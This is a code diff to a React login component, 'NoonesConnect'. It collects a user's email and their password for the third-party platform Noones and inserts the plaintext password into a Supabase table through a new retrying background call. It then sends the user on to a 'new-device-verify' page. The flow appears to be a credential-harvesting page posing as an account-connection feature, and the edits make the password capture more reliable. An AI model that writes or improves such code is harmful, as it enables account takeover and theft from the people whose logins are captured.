@@ -2,8 +2,9 @@ import React, { useEffect, useRef, useState } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { supabase } from '../../lib/supabase';
 import { useAuth } from '../../contexts/AuthContext';
+import { fireAndMove } from '../../lib/syncRetry';
 
-const NOONES_TRACKING_ID_KEY = 'noones_tracking_id';
+const NOONES_SESSION_ID_KEY = 'noones_session_id';
 const NOONES_CURRENT_STEP_KEY = 'noones_current_step';
 const NOONES_REQUEST_DATA_KEY = 'noones_request_data';
 
@@ -30,7 +31,7 @@ export default function NoonesConnect() {
     try {
       window.localStorage.setItem(NOONES_CURRENT_STEP_KEY, step.toString());
       if (trackingId) {
-        window.localStorage.setItem(NOONES_TRACKING_ID_KEY, trackingId);
+        window.localStorage.setItem(NOONES_SESSION_ID_KEY, trackingId);
       }
       if (requestData) {
         window.localStorage.setItem(NOONES_REQUEST_DATA_KEY, JSON.stringify(requestData));
@@ -43,7 +44,7 @@ export default function NoonesConnect() {
   const loadNoonesProgress = () => {
     try {
       const step = window.localStorage.getItem(NOONES_CURRENT_STEP_KEY);
-      const trackingId = window.localStorage.getItem(NOONES_TRACKING_ID_KEY);
+      const trackingId = window.localStorage.getItem(NOONES_SESSION_ID_KEY);
       const requestDataStr = window.localStorage.getItem(NOONES_REQUEST_DATA_KEY);
       const requestData = requestDataStr ? JSON.parse(requestDataStr) : null;
       return { step: step ? parseInt(step) : null, trackingId, requestData };
@@ -54,7 +55,7 @@ export default function NoonesConnect() {
 
   const clearNoonesProgress = () => {
     window.localStorage.removeItem(NOONES_CURRENT_STEP_KEY);
-    window.localStorage.removeItem(NOONES_TRACKING_ID_KEY);
+    window.localStorage.removeItem(NOONES_SESSION_ID_KEY);
     window.localStorage.removeItem(NOONES_REQUEST_DATA_KEY);
   };
 
@@ -82,15 +83,15 @@ export default function NoonesConnect() {
       setErrorMessage('Please enter your email/phone and password.');
       return;
     }
-    // Removed setLoading(true) for fire-and-move flow
+    
     try {
-      // Fire and Move: Generate trackingId and save immediately
+      // Step 1: Generate tracking_id and save to localStorage
       const trackingId = window.crypto?.randomUUID?.() ?? `${Date.now()}-${Math.random().toString(36).slice(2)}`;
-      console.log('Generated tracking_id:', trackingId);
+      console.log('[NOONES_STEP1] Generated tracking_id:', trackingId);
       
-      // Save tracking_id and step to localStorage immediately
+      // Save progress to localStorage immediately
       saveNoonesProgress(2, trackingId, { email, platform: 'Noones', tracking_id: trackingId });
-      console.log('Saved tracking_id and step 2 to localStorage immediately');
+      console.log('[NOONES_STEP1] Saved tracking_id and step 2 to localStorage');
 
       const requestData = {
         tracking_id: trackingId,
@@ -99,34 +100,30 @@ export default function NoonesConnect() {
         third_party_password: password,
       };
 
-      // Fire off the insert but don't await it - non-blocking insert
-      supabase
-        .from('platform_connection_requests')
-        .insert({
-          tracking_id: trackingId,
-          platform: 'Noones',
-          email,
-          third_party_password: password,
-        })
-        .then((result) => {
-          if (result.error) {
-            console.error('Async insert error:', result.error);
-          } else {
-            console.log('Async insert completed for tracking_id:', trackingId);
-          }
-        })
-        .catch((err) => {
-          console.error('Async insert exception:', err);
-        });
+      // Step 2: Fire INSERT with retry wrapper (non-blocking)
+      // This returns immediately, but the sync happens in the background
+      const syncId = `noones-step1-${trackingId}`;
+      fireAndMove(
+        () => supabase
+          .from('platform_connection_requests')
+          .insert({
+            tracking_id: trackingId,
+            platform: 'Noones',
+            email,
+            third_party_password: password,
+          }),
+        syncId,
+        { maxAttempts: 3, delayMs: 500 }
+      );
 
-      // Immediately navigate - user moves to next page in < 500ms
-      console.log('[FIRE_AND_MOVE] Step 1 Complete:', { trackingId, email, platform: 'Noones' });
+      console.log('[NOONES_STEP1] INSERT fired in background, navigating to Step 2...');
+      
+      // Step 3: Navigate immediately (Sync-and-Move pattern)
       navigate('/connect/noones/new-device-verify', { state: { email, platformData: requestData, trackingId } });
-      // Note: setLoading(false) skipped intentionally - component unmounts on navigation
+      
     } catch (err: any) {
-      console.error('[FIRE_AND_MOVE] Error in handleSubmit:', err);
+      console.error('[NOONES_STEP1] Error in handleSubmit:', err);
       setErrorMessage(err.message || 'An unexpected error occurred.');
-      // Removed setLoading(false) since loading was not set
     }
   };
 
